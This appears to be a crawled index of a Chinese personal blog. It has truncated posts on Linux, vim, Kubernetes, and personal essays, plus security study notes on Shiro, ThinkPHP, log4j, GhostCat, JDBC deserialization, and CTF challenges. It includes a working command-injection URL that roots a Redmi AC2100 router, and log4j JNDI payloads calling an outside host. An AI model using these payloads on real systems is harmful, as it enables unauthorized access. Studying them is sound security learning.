2020年下半年，我将自己的主力电脑全面迁移到了Manjaro Linux下，那个时候qv2ray还很活跃，我的科学上网也很依赖它，但是有好几次在更新的时候发生了Manjaro …  </content></entry><entry><title>vim/neovim 的问题</title><url>/posts/tech-thinking-about-vim/</url><categories><category>技术</category></categories><tags/><content type="html">   在消磨三年时光之后，我终于明白这个编辑器还远远称不上稳定，在道路的尽头之前，我能做的其实只有观望。
记得之前看到过一个例子, 发动机能够成功的关键在于它成功将&amp;amp;quot;运动&amp;amp;quot;这一复杂的行为集合抽象成了旋转运动, 一切运动皆旋转, 所以发动机只需要做好旋转就可以了, 用户可以踩油门, 可以拧把手, 可以做出各种各样不同的操作行为, 但是这些行为具体作用到发动机的时候, 就统统变成了旋转多快, 往哪里旋转. 由于发动机对运动集合进行了高度的抽象, 因此使得其原理变得简单而易于迁移, 进而让发动机的抽象成为了动力机器的事实意义上的标准. 从一个理科生的视角来看, 这是一个浪漫且实用的设计.
再来看另一个极端的案例, 假设有这么一台机器, 它并不像发动机那样对运动集合进行抽象, 它将所有的运动方式都保存在一张HashMap中, 但是它提供了一个轮盘, 用户只需要将轮盘转动到合适的位置, 就可以从HashMap中找到用户所期望执行的运动方式. 这是一个很怪的案例, 因为它所做的正好与发动机所做的事情相反, 它并不对动力机器的行为做出抽象, 而是对用户的行为进行抽线, 将用户执行的所有操作都抽象为旋转. 当然, 这样的机器就算被发明出来, 也早就被彻底抛弃了, 但是类似的, 不那么极端的设计, 依旧存在, 比如这篇文章要说的vim.
vim所提倡的全键盘操作确实让人眼前一新，其基本的操作逻辑是将用户的行为抽象为四个模式（Normal Insert Visual Command），之后的所有插件，不管是语法补全还是其他，都是在这个操作逻辑上进行的补充。不得不说，如果习惯了这样的操作逻辑，使用起来确实是比较舒适的，只要你不遇到一些问题
忘记了键位 作为一个自定义程度极高的编辑器，自定义键位是不可避免的事情，并且由于vim缺乏有效的鼠标操作，所以需要定义键位数量和普通的IDE相比会多得多。举个例子，在IDE下用括号去包裹一个词，需要用鼠标选中那个字符串然后按下括号就可以了，但是在neovim中，需要使用插件surround.nvim，使用ysiw(为它添加，且不说这个操作行为需要你连续又快速按下五个键（慢了nvim就不认了），这个键位只适用于光标所处在的词语，如果要为一段话添加呢？那还会有别的键位，但是如果是鼠标的话就还是同样的操作。
从这里就可以暴露 …  </content></entry><entry><title>在红米ac2100路由器上开启clash</title><url>/posts/tech-clash-ac2100/</url><categories><category>技术</category></categories><tags/><content type="html"><![CDATA[   在争取自由这个宏大命题下, 上网自由可以算得上一件&quot;小事&quot;, 然而越是小事, 越与我们的日常息息相关.
事情的起因是装kubernetes遇到了网络问题且换镜像源无用, 想了想自己对在路由器上fq也感兴趣了很久, 索性查查看, 没想到还挺容易的.
开启ssh ac2100这个型号的路由器存在命令注入漏洞, 可以通过该漏洞开启clash.
登陆到路由器面板,从url中复制stok,替换下面的stok
# 命令执行漏洞开启ssh http://192.168.31.1/cgi-bin/luci/;stok=&lt;STOK&gt;/api/misystem/set_config_iotdev?bssid=Xiaomi&amp;user_id=longdike&amp;ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20&#39;s%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg&#39;%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B # 命令执行漏洞修改ssh密码, 这里用的密码为admin http://192.168.31.1/cgi-bin/luci/;stok=&lt;STOK&gt;/api/misystem/set_config_iotdev?bssid=Xiaomi&amp;user_id=longdike&amp;ssid=-h%3B%20echo%20-e%20&#39;admin%5Cnadmin&#39;%20%7C%20passwd%20root%3B 然后在自己的电脑上ssh连接,密码admin
ssh root@192.168.31.1 如果报错了,就在.ssh/config中添加
Host 192.168.31.1 PubkeyAcceptedAlgorithms +ssh-rsa HostkeyAlgorithms +ssh-rsa 安装clash ssh登陆到路由器后, 运行:
export url=&#39;https://cdn.jsdelivr.net/gh/juewuy/ShellClash@master&#39; &amp;&amp; sh -c &#34;$(curl -kfsSl $url/install.sh)&#34; &amp;&amp; source /etc/profile &amp;&gt; /dev/null 面板安装不成功的话就换源装.其他就跟着脚本的提示走就可以了
  ]]></content></entry><entry><title>服务器过期之后</title><url>/posts/gossip-boring-note-md/</url><categories><category>碎碎念</category></categories><tags/><content type="html">   超元域这个词, 出自雪崩这本书, 人们在这个虚拟世界中可以随意行事, 尽情做自己, 这也是我的初衷: 把发言权还给我
对于自己的博客, 我其实是抱着一种矛盾的心态去管理的: 一方面, 在阿里云买了服务器将自己的博客部署在上面后确实让国内用户可以看到我写的垃圾了, 之前无意认识的一个师傅就告诉我说以前还看过我的博客, 让我觉得有些开心; 另一方面, 我又必须在国内备案, 需要实名制, 需要在博客的底部悬挂一个可笑的备案号来表达自己已经被招安了, 既然被招安, 那么很多我想说的话, 我想分享的有价值的东西, 就不敢说也不想说了.
这种心态困扰了我很久, 也因为我确实不再搞安全了, 于是就没再更新有价值的东西了. 这种情况一直持续, 直到发现其实我的东西并没有什么人会来看, 也没有技术佬对我文章里的瑕疵和动机指指点点, 写博客的价值更多是鞭策自己而不是对别人. 想开了之后我就再无顾忌了, 正好阿里云的服务器也到期了, 原来的博客销毁, 我把博客放在了git page上, 去掉了那如同罪犯烙印般的国内备案号.
曾经的自己, 是真的想一直让国内人看到自己写的博客的, 为此那个时候我续费了三年的服务器, 但是这两年的舆论审查, 权力滥用还有网络暴力, 让国内的环境看起来越来越有黑暗森林的味道了. 失望和无奈让我最终放弃了当初天真的想法, 正好, 有幸在b站上通过看瓶子君的直播间知道了斯诺登的永久记录这本书, 于是有幸拜读了一下, 给我印象最深刻的片段如下:
我回头重看以前的帖文,开始畏畏缩缩起来。当时说的话有一半是无心之论,我只想引人注意,没想过有一天要对一位戴着方框眼镜的白发男子做解释,他的视线扫过贴着“永久保存记录”标签的巨型资料夹。而另一半言论,我想当时是有心这么说的,这让情况更糟,因为我不再是当年那个懵懂无知的孩子,我已经长大成人。连我都认不出自己说过这样的话。还有个问题是,现在我对那些激情又冲动的观点心生反感。我发现自己要跟幽灵争辩,要跟愚蠢、幼稚、偶尔露出残酷面的自我打一架,但这样的我已不复存在。想到可能永远被这种鬼魅纠缠,我没办法忍受,可又不知有什么最好的方法来表达我的自责懊悔,让我与其保持距离,我也疑惑究竟该不该这么做。那些我后悔不已却又几乎遗忘的过去,依旧通过科技死缠着我不放,实在令人发指。
我们这个最先在网络环境中成长的世代,对这样的问题再熟悉不过。我们发 …  </content></entry><entry><title>virtualbox中搭建kubernetes集群</title><url>/posts/tech-k8s-setup/</url><categories><category>技术</category></categories><tags/><content type="html"><![CDATA[  环境问题, 一生之敌.
准备 网络问题 这是最重要的问题, 国内的那些借助于镜像源的扭曲解决方案在我这里不好使. 推荐在路由器上安装clash
virtualbox安装ubuntu18.04 这步没什么好讲的, 要注意的是使用桥接网络模式, 为什么? 因为集群内通信, 如果不使用桥接模式, 那就只能使用 NAT network来进行node之间通信+Host Only让宿主机能够连接+NAT让虚拟机可以连接到外网去, 在这种情况下, 环境就会变得很复杂, 所以还是选择桥接模式比较好.
那桥接模式有什么不好的地方吗? 有, 如果你的宿主机开着代理, 桥接模式是走不了你宿主机的代理的, 即便开启了Allow LAN也无济于事, 除非你桥接到了代理软件的虚拟网卡上, 但是这条路我没走通, 所以最后选择了在路由器上安装clash
网卡类型使用NAT+Host Only就可以了, Host Only那里最好新建一张网卡, NAT用于集群的对外网络请求(下载之类的), 宿主机上使用clash tun或者dae或者v2raya都可以开启透明代理来让虚拟机可以连接外网.
然后在netplan中启用第二张网卡并设置静态ip, 例如
network: ethernets: enp0s3: dhcp4: true enp0s8: dhcp4: no addresses: [192.168.59.125/24] version: 2 关闭swap swayoff -a # 临时禁用 如果永久禁用, 修改/etc/fstab
安装依赖 docker apt-get update &amp;&amp; apt-get install -y \ apt-transport-https ca-certificates curl software-properties-common gnupg2 curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - add-apt-repository \ &#34;deb [arch=amd64] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable&#34; apt-get update &amp;&amp; apt-get install -y \ containerd.io=1.2.13-1 \ docker-ce=5:19.03.8~3-0~ubuntu-$(lsb_release -cs) \ docker-ce-cli=5:19.03.8~3-0~ubuntu-$(lsb_release -cs) cat &gt; /etc/docker/daemon.json &lt;&lt;EOF { &#34;exec-opts&#34;: [&#34;native.cgroupdriver=systemd&#34;], &#34;log-driver&#34;: &#34;json-file&#34;, &#34;log-opts&#34;: { &#34;max-size&#34;: &#34;100m&#34; }, &#34;storage-driver&#34;: &#34;overlay2&#34; } EOF systemctl daemon-reload; systemctl restart docker kubernetes sudo apt-get update &amp;&amp; sudo apt-get install -y apt-transport-https curl curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add - cat &lt;&lt;EOF | sudo tee /etc/apt/sources.list.d/kubernetes.list deb https://apt.kubernetes.io/ kubernetes-xenial main EOF sudo apt-get update; apt-get install -y kubelet=1.25.3-00 kubeadm=1.25.3-00 kubectl=1.25.3-00; apt-mark hold kubelet kubeadm kubectl echo &#39;alias k=kubectl&#39; &gt;&gt; ~/.bashrc ; source ~/.bashrc 清理 kubeadm reset rm -r ~/.kube /etc/containerd/config.toml /etc/cni/net.d systemctl restart containerd 集群安装 master setup kubeadm init --pod-network-cidr=10.244.0.0/16 --service-cidr=10.96.0.0/12 --apiserver-advertise-address=192.168.59.126 mkdir -p $HOME/.kube;sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config;sudo chown $(id -u):$(id -g) $HOME/.kube/config 然后安装flannel, 下载 https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml , 然后往其中添加网卡的名称
... containers: - name: kube-flannel image: docker.io/flannel/flannel:v0.21.4 #image: docker.io/rancher/mirrored-flannelcni-flannel:v0.21.4 command: - /opt/bin/flanneld args: - --ip-masq - --kube-subnet-mgr - --iface=enp0s8 &lt;-- 添加 ... 然后执行kubectl apply -f kube-flannel.yml就行
worker setup rm /etc/containerd/config.toml systemctl restart containerd docker kubelet kubeadm join 10.0.2.15:6443 --token am85zn.iymt1qn11oel8ktn \ --discovery-token-ca-cert-hash sha256:ede03b0defa4929ccfcbf6a21ae924cdd6947c5fe6a0090144c3ccea00475344 然后修改10-kubeadm.conf添加静态ip地址就完成了.
部署应用 来装个简单的应用
apiVersion: apps/v1 kind: Deployment metadata: # 部署名字 name: test-k8s spec: replicas: 2 # 用来查找关联的 Pod，所有标签都匹配才行 selector: matchLabels: app: test-k8s # 定义 Pod 相关数据 template: metadata: labels: app: test-k8s spec: # 定义容器，可以多个 containers: - name: test-k8s # 容器名字 image: ccr.ccs.tencentyun.com/k8s-tutorial/test-k8s:v1 # 镜像 然后部署service
apiVersion: v1 kind: Service metadata: name: test-k8s spec: selector: app: test-k8s type: NodePort ports: - port: 8080 # 本 Service 的端口 targetPort: 8080 # 容器端口 nodePort: 31000 # 节点端口，范围固定 30000 ~ 32767, 虚拟机外的机器可以通过该端口访问内部服务 来访问一下, 顺利就好
  ]]></content></entry><entry><title>2021年度总结</title><url>/posts/gossip-2021-summary/</url><categories><category>碎碎念</category></categories><tags/><content type="html">  这是一篇拖延了很久的年度总结,在下决心写它的时候,我已经从过年开始无所事事地玩了十几天的游戏了,本来说好要在过年那天写的总结也一直到现在才开始动笔,着实是惭愧.
今年值得记录的一些事件:
毕业设计的经过 在本科学校的最后时光 入学研究生院校 今年的状态: 依然在迷茫和纠结之中,但是逐渐意识到只要行动起来的话,自己的道路会越来越清晰的.
21年年初在家的时候,我在写自己的毕业设计&amp;amp;ndash;一个基于区块链的商品交易系统.在看了一些b站的关于vue的视频之后我写了一个非常简陋的前端页面,毕业设计的后端部分使用了koa框架并运行在ganache环境中,至于智能合约部分的内容总体上在回家前就写差不多了.但其实自己原本的打算是在回家之前就把毕业设计做完的,但是在经历了实习被拒事件之后心态彻底摆烂,有一点没一点的做毕业设计,以至于到寒假结束后又花了一些时间才差不多算完成.
记得第一次写完毕设论文之后给老师看还被痛骂了一通,拿回去认认真真的进行了大改,这才意识到毕业设计最关键的部分是毕业论文,于是接下来的时间里面,格式问题和篇幅内容成了我最关注的东西.在这里也必须感谢我的指导老师在凌晨时分还给我发指导意见.
到了毕业设计的最后阶段,先是去项目为导向的毕业设计验收现场,在被灵魂质问一句&amp;amp;quot;你这个系统农民能用吗&amp;amp;quot;之后黯然退下,然后是在毕业答辩环节非常快速而简略地阐述了我的工作内容.也正是在答辩环节我才发现有的人的毕设真是非常硬核,虽然其中有些是拿之前做过的成果来用的,也有人真就硬划水,不仅实验数据是模拟生成的,整个毕设还拆成三个部分给三个人做,真是无了个大语.不管怎么样,在结束答辩回到宿舍楼活动室中时,看着那些焦急而又紧张等待答辩的眼神时,我才意识到,都结束了,不仅要和那些熬夜改论文的夜晚说再见了,也要和那些为了绩点焦头烂额复习的日夜和考场上紧张答题的分秒说再见了.那些因为课程和成绩或是焦虑或是迷茫的岁月终于要和我说再见了,尽管我并不讨厌它们,甚至哪怕我有时会因为保研制度而满腹牢骚,却也不得不承认,这些经历已经成为了自己的烙印.
随着毕业的临近,降级了的室友jm也要离开学校去参加几个月的实习了.我们宿舍最后一次吃饭是在食堂二楼的烤肉店中,第二天,宿舍就只剩下三人了.
毕设结束后的时间里,时而伤感的自己急需一个可以投入精力的事情来控制自己的情绪,于是巧合之下,我接触 …  </content></entry><entry><title>pwnable尝试</title><url>/posts/sec-pwnable/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[  尝试学pwn,放弃学pwn
start 下载, 反编译获得如下代码
.text:08048060 public _start .text:08048060 _start proc near ; DATA XREF: LOAD:08048018↑o .text:08048060 push esp .text:08048061 push offset _exit .text:08048066 xor eax, eax .text:08048068 xor ebx, ebx .text:0804806A xor ecx, ecx .text:0804806C xor edx, edx .text:0804806E push &amp;#39;:FTC&amp;#39; .text:08048073 push &amp;#39; eht&amp;#39; .text:08048078 push &amp;#39; tra&amp;#39; .text:0804807D push &amp;#39;ts s&amp;#39; .text:08048082 push 2774654Ch .text:08048087 mov ecx, esp ; addr .text:08048089 mov dl, 14h ; len .text:0804808B mov bl, 1 ; fd .text:0804808D mov al, 4 .text:0804808F int 80h ; LINUX - sys_write .text:08048091 xor ebx, ebx .text:08048093 mov dl, 3Ch ; &amp;#39;&amp;lt;&amp;#39; .text:08048095 mov al, 3 .text:08048097 int 80h ; LINUX - .text:08048099 add esp, 14h .text:0804809C retn .text:0804809C _start endp ; sp-analysis failed esp压栈, 返回地址压栈 清空了eax, ebx, ecx, edx 四次push压入字符串 Let’s start the CTF : 将栈顶地址作为参数移到ecx中 将20移到dl (edx的低八位)中, 20 就是上面字符串的长度 sys_write将要向stdout写入, 所以 …  ]]></content></entry><entry><title>shiro 漏洞复现</title><url>/posts/sec-shiro-attack/</url><categories><category>安全研究</category></categories><tags/><content type="html"><![CDATA[   记录shiro漏洞学习的过程, 参考https://saucer-man.com/information_security/396.html, 并在漏洞分析基础上编写检测脚本
环境搭建 git clone https://github.com/apache/shiro.git cd shiro git checkout shiro-root-1.2.4 设置shiro/samples/web/pom.xml, 添加版本1.2
&amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;javax.servlet&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;jstl&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.2&amp;lt;/version&amp;gt; &amp;lt;scope&amp;gt;runtime&amp;lt;/scope&amp;gt; &amp;lt;/dependency&amp;gt; 为tomcat8文件添加权限
sudo chmod -R 755 /var/lib/tomcat8 sudo chmod -R 755 /etc/tomcat8 使用idea打开shiro/samples/web项目, 等待maven项目依赖下载完成, 编辑配置
进入Deployment, 添加artifact
启动项目, 看到下面的页面就说明环境搭建完成了
漏洞调试 登陆过程 首先看登陆过程, 在org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin打下断点, 随后在浏览器中选中Remember Me选项进行登陆, 程序进入断点:
在forgetIdentity函数中, 会尝试获取request 和 response, 并移除之前的身份信息.
回到之前的函数, 进入第一个if分支, 进入rememberIdentity函数, this.getIdentityToRemember函数获取到身份信息, 然后调用rememberIdentity函数.
rememberIdentity函数中, 首先将accountPrincipals转换成bytes
转换的逻辑为先进行序列化然后再进行加密, 如下
加密的方式为AES加密
跟进密钥获取的函数
从最后一行可以看到,在对象初始化的时候, 自动设置 …  ]]></content></entry><entry><title>thinkphp5漏洞学习</title><url>/posts/sec-phpggc-thinkphp/</url><categories><category>安全研究</category></categories><tags/><content type="html"><![CDATA[   phpggc中关于thinkphp的攻击思路学习
5.0.4-5.0.24 写文件 使用用法
第一个参数是要写到哪个文件夹下面,第二个参数是本地的文件路径,后面base64会将换行符号去除 ./phpggc ThinkPHP/FW1 /srv/http/tp5/ shell.php | base64 -w 0 环境搭建 在controller下面的Index.php中写入反序列化代码
&amp;lt;?php namespace app\index\controller; class Index { public function index() { unserialize(base64_decode($_GET[&amp;#39;a&amp;#39;])); } } 漏洞分析 调试开始, 首先在think\Process#__destruct下断点, 随后跟进到close函数中,这里控制processPipes为think\model\relation\HasMany对象,触发其__call方法,进而进入其baseQuery 方法. 在这个方法中可以触发think\console\Output的__call方法
在这个__call方法中,可以看到调用了call_user_func_array函数, 调用的是block函数, 参数是我们控制的payload
这里前面的AAA是为了绕过后文中出现的死亡exit而添加的.后面再说.
又经过了think\console\Output的writeln 和write 方法后进入 think\session\driver\Memcache#write,
handler是think\cache\driver\Memcached对象,进入其set方法
&amp;lt;butu
进入set方法中的has方法
handler是think\cache\driver\File对象,get方法调用了getCacheKey方法
返回结果为php://filter/convert.base64-decode/resource=/srv/http/tp5/6a644d26b09257b882dae6e407f23d42.php, 因为这不是一个文件,所以返回了default的值也就是false, 那么前面提到的think\cache\driver\Memcached#has返回 …  ]]></content></entry><entry><title>log4j2 jndi 漏洞学习和调试</title><url>/posts/sec-log4j2-jndi/</url><categories><category>安全研究</category></categories><tags/><content type="html"><![CDATA[   明天安全圈校招面试: 面试官: 请说说你会什么技能? 我: ${jndi:ldap://xxx.dnslog.cn/exp} 面试官: 请说说你最近关注过的漏洞? 我: ${jndi:ldap://xxx.dnslog.cn/exp} 面试官: 你平时有动手调试过吗? 我: ${jndi:ldap://xxx.dnslog.cn/exp} 我：这dnslog是不是卡了 这面试官怎么还没rce
环境搭建 新建maven项目, pom.xml写入
&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-api&lt;/artifactId&gt; &lt;version&gt;2.14.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 在官网 https://archive.apache.org/dist/logging/log4j/ 下载log4j然后在project structure中导入 下载低版本java8 https://repo.huaweicloud.com/java/jdk/ 我下载的是8u181,将其作为java运行环境 写测试代码
import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class Main { private static final Logger logger = LogManager.getLogger(); public static void main(String[] args){ logger.error(&#34;${jndi:ldap://39.105.176.37:1389/smzifq}&#34;); } } 漏洞调试 调试进入 调试到 然后调试到MessagePatternConverter#format方法, 看到这里会试图匹配${字符.并将payload字符串解析到变量value中去.
步进replace函数, 再步进substitute函数 进入下一个substitute中会看到它会匹配结尾的} 再往下就可以看到resolveVariable方法被调用, 里面调用了lookup方法 在lookup方法中,会试图寻找:,并将:前面的部分作为prefix, 随后根据prefix来寻找类
可以看到这里规定了不同的prefix对应的类
使用的Jndi,所以使用的是JndiLookup类,调用了JndiLookup#lookup方法,并将:后面的部分作为参数传入.
最后调用到了javax.naming.InitialContext#lookup方法,server端收到请求 漏洞利用 普通的jndi注入就可以了
参考 https://www.anquanke.com/post/id/262668#h3-5   ]]></content></entry><entry><title>赛博内卷</title><url>/posts/gossip-cyberpunk/</url><categories><category>碎碎念</category></categories><tags/><content type="html"><![CDATA[  科技的发展并不代表内卷的避免,相反,一味追求在虚拟世界中开疆拓土,忽视宇宙和深海的探索开发正是人类社会内卷化的集中反映,此处的内卷,和通常的内卷定义相同,即&amp;quot;一类文化模式达到了某种最终的形态以后,既没有办法稳定下来,也没有办法转变为新的形态.而只能不断地在内部变得更加复杂的现象&amp;quot;,只不过对象从普通的小群体变成了全体人类,社会矛盾的频繁爆发让人类倾向于将自己的灵与肉奉献给虚拟的神,这种奉献的热诚背后充斥着对冰冷现实的无力感和逃避,即便这种虚拟是人类自己创造出来的,他们依旧选择忽视甚至忘却这种自知,选择被奴役,膜拜和瞻仰.
另外一方面,正如洛夫克拉夫特所说的&amp;quot;人类最古老又最强烈的情绪,就是恐惧;而最古老又最强烈的恐惧,是对未知的恐惧&amp;quot;,在刻录在基因中的人性的驱使下,人类在总体层面上对未知的深海和太空是恐惧的,可是,要让人类接受自己社会发展停滞不前的事实,又是可耻且无法接受的.在这种背景下,虚拟世界的扩张从另一个角度为全体人类提供了一个&amp;quot;发展&amp;quot;的幻象,使得人类可以将蒙蔽双眼,逃脱生存困境,将注意力集中在已有事物的&amp;quot;发展&amp;quot;上,即便是内卷式的发展.
从理性的角度来说,人类文明要想长存不休,必须要将触角极力扩张到太空和海洋当中,然而人类总体上呈现的是一种非理性的意识形态,这并不新奇,在上帝已死的年代里,人类相信的不再是神明而是科技和资本,而科技为资本所掌控,所以资本的信仰便是人类的信仰,乍看之下,资本代表着贪婪和逐利,并且具备一定程度上的理性,但可惜的是,正是这种信仰将虚拟世界捧上神坛并加剧了社会的内卷化,而这种情况很难发生改变,理由如下:
资本并不具备引领人类社会向好发展的动机,资本行动的唯一动机是为自身逐利
资本理性的主体在&amp;quot;自己的寿命是有限的&amp;quot;这样一个前提下,会自发选择在&amp;quot;当下&amp;quot;时间点获利最大的发展方向
当资本在一个领域中能或即将获取足够多利润,或者发现切换别的领域所付出的代价远大于自己所失去的时候,它将调用舆论吸引人类的注意力以期更大的利润空间
人类是盲从且愚昧的,尤其是在被消费社会阉割批判能力后基本上已经丧失了真正的自由意志,成为资本的牵线木偶.
一个额外的发现是,如果将上述三个理由作为评判资本能力的标准,就会发现腾讯阿里巴巴等不靠科技驱动的公司才是 …  ]]></content></entry><entry><title>GhostCat(CVE-2020-1938)漏洞学习</title><url>/posts/sec-ghostcat/</url><categories><category>安全研究</category></categories><tags/><content type="html"><![CDATA[   本文主要参考 https://blog.csdn.net/qq_31481187/article/details/105917392 和 https://paper.seebug.org/1142/#_6 ，并无原创内容，仅仅是个人学习笔记。
漏洞原理 官网对AJP协议的介绍如下
The AJP Connector element represents a Connector component that communicates with a web connector via the AJP protocol. This is used for cases where you wish to invisibly integrate Tomcat into an existing (or new) Apache installation, and you want Apache to handle the static content contained in the web application, and/or utilize Apache&amp;rsquo;s SSL processing.
https://blog.hillpig.top/apache-tomcat-nginx/ 中提到了AJP协议的使用场景，可以参考一下。
该漏洞主要是由于Tomcat 对从AJP协议传来的数据没有正确解析，导致攻击者可以控制以下三个参数
javax.servlet.include.request_uri javax.servlet.include.path_info javax.servlet.include.servlet_path 在tomcat目录下的conf/web.xml中，规定了两种servlet，分别用于处理默认类型的文件（比如静态资源）和JSP类型的路径请求。
&amp;lt;servlet&amp;gt; &amp;lt;servlet-name&amp;gt;default&amp;lt;/servlet-name&amp;gt; &amp;lt;servlet-class&amp;gt;org.apache.catalina.servlets.DefaultServlet&amp;lt;/servlet-class&amp;gt; &amp;lt;init-param&amp;gt; …  ]]></content></entry><entry><title>mysql jdbc反序列化的不深入研究</title><url>/posts/sec-jdbc-unserialize/</url><categories><category>安全研究</category></categories><tags/><content type="html">   我终于更新博客了……
漏洞原理 当jdbc客户端连接到远程mysql服务器的时候，双方在连接过程中会进行一些数据交换并执行一些查询语句，比如SHOW SESSION STATUS，在使用特定构造的jdbc链接去连接mysql服务器时，SHOW SESSION STATUS的返回数据会在客户端进行反序列化进而触发RCE代码。
根据 http://m0d9.me/2021/04/20/Jdbc-%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%BA%8C%EF%BC%9AMySQL-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ 中的描述，可以通过以下方式手动触发反序列化，注意这不是在触发jdbc反序列化漏洞，但是在后面利用的时候有用。
CREATE DATABASE IF NOT EXISTS test; CREATE TABLE IF NOT EXISTS test.eviltable ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, evil blob, PRIMARY KEY (`id`) ); set …  </content></entry><entry><title>使用idea开启Servlet</title><url>/posts/tech-idea-start-servlet/</url><categories><category>技术</category></categories><tags/><content type="html"><![CDATA[  采用的是版本较新的idea2020.2, 使用的操作系统为MANJARO LINUX, 其中的过程挺迷迷糊糊的就水一篇来记录一下.
File --&amp;gt; New --&amp;gt; Project --&amp;gt; Java --&amp;gt; Nextnext 新建一个项目 右键Project --&amp;gt; open module setting --&amp;gt; 点击+号 --&amp;gt; 导入tomcat8的Servlet-api.jar 右键项目 --&amp;gt; Add Frameworks Support --&amp;gt; 选中web application 选中后会多出来几个东西, 如下图, 多了WEB-INF目录和index.jsp
Web-INF里面有只有一个web.xml, 什么是WEB-INF? 根据百度百科的介绍
WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。
WEB-INF文件夹下除了web.xml外，还存一个classes文件夹，用以放置 *.class文件，这些 *.class文件是网站设计人员编写的类库，实现了jsp页面前台美工与后台服务的分离，使得网站的维护非常方便。web.xml文件为网站部署描述XML文件，对网站的部署非常重要。
Web-Inf文件夹中除了有classes文件夹和一个web.xml文件外、还有lib文件夹（用于存放需要的jar包）（用于配置，比如说用来配置过滤器等。）
/WEB-INF/src/ 源码目录，按照包名结构放置各个java文件。
/WEB-INF/database.properties 数据库配置文件
/WEB-INF/tags/
存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名，当使用自定义的标签文件库名称时，在使用标签文件时就必须声明正确的标签文件库路径。例如：当自定义标签文件库名称为 simpleTags 时，在使用 simpleTags 目录下的标签文件时，就必须在 jsp 文件头声明为：&amp;lt;%@ taglibprefix=&amp;ldquo;tags&amp;rdquo; tagdir=&amp;quot;/WEB-INF …  ]]></content></entry><entry><title>GACTF2020</title><url>/posts/ctf-gactf2020/</url><categories><category>CTF</category></categories><tags/><content type="html"><![CDATA[  simpleflask 和以往的flask不一样的地方在于, 这里是经过更新后的flask, 计算pin码的方式已经和以前不一样了, 参考 https://www.chainnews.com/articles/898433701852.htm , 不过问题不大,就把machine-id拼接在docker那一串东西的前面就可以了, 需要注意的是每十分钟重启时候的机器mac地址是会变化的.
ezflask 点击看到代码
# -*- coding: utf-8 -*- from flask import Flask, request import requests from waf import * import time app = Flask(__name__) @app.route(&#39;/ctfhint&#39;) def ctf(): hint =xxxx # hints trick = xxxx # trick return trick @app.route(&#39;/&#39;) def index(): # app.txt @app.route(&#39;/eval&#39;, methods=[&#34;POST&#34;]) def my_eval(): # post eval @app.route(xxxxxx, methods=[&#34;POST&#34;]) # Secret def admin(): # admin requests # if __name__ == &#39;__main__&#39;: app.run(host=&#39;0.0.0.0&#39;,port=8080) 发现&quot; ' [ ( 都被过滤了, 简直离谱
eval=ctf.__globals__ 来查看ctf函数所处在的命名空间下所能接触到的变量和函数
{&#39;my_eval&#39;: &lt;function my_eval at 0x7fb525c35dd0&gt;, &#39;app&#39;: &lt;Flask &#39;app_1&#39;&gt;, &#39;waf_eval&#39;: &lt;function waf_eval at 0x7fb525c35c50&gt;, &#39;admin&#39;: &lt;function admin at 0x7fb525b7f650&gt;, &#39;index&#39;: &lt;function index at 0x7fb525c35d50&gt;, &#39;waf_ip&#39;: &lt;function waf_ip at 0x7fb525c35b50&gt;, &#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;admin_route&#39;: &#39;/h4rdt0f1nd_9792uagcaca00qjaf&#39;, &#39;__file__&#39;: &#39;app_1.py&#39;, &#39;request&#39;: &lt;Request &#39;http://124.70.206.91:10003/eval&#39; [POST]&gt;, &#39;__package__&#39;: None, &#39;Flask&#39;: &lt;class &#39;flask.app.Flask&#39;&gt;, &#39;ctf&#39;: &lt;function ctf at 0x7fb525c35cd0&gt;, &#39;waf_path&#39;: &lt;function waf_path at 0x7fb525c35bd0&gt;, &#39;time&#39;: &lt;module &#39;time&#39; from &#39;/usr/local/lib/python2.7/lib-dynload/time.so&#39;&gt;, &#39;__name__&#39;: &#39;__main__&#39;, &#39;requests&#39;: &lt;module &#39;requests&#39; from &#39;/usr/local/lib/python2.7/site-packages/requests/__init__.pyc&#39;&gt;, &#39;__doc__&#39;: None} 发现了admin_route, 然后那里是可以发起一个对外请求的, 经过测试发现127.0.0.1和0.0.0.0及其变形都会触发警告并退出, 盲猜这里考察的是302重定向, 在服务端那里写下
&lt;?php header(&#34;Location: http://127.0.0.1:8080/&#34;); ?&gt; ssrf成功, 但是下一步干嘛呢?
__code__, 函数的代码块
__code__.co_consts 代码块中的所有常量的元组, 参考https://docs.python.org/3/library/inspect.html
eval=ctf.__code__.co_consts (None, &#39;the admin route :h4rdt0f1nd_9792uagcaca00qjaf&lt;!-- port : 5000 --&gt;&#39;, &#39;too young too simple&#39;) 然后通过302重定向访问127.0.0.1:5000, 是一个常规的ssti,再次重定向
XWIKI 找到了CVE, 然后根据例子反弹shell后发现有一个二进制文件, 会给你很多选择题比较大小的, 到这里就做不出来了, 不过看到其他选手的脚本, 这里记录一下.
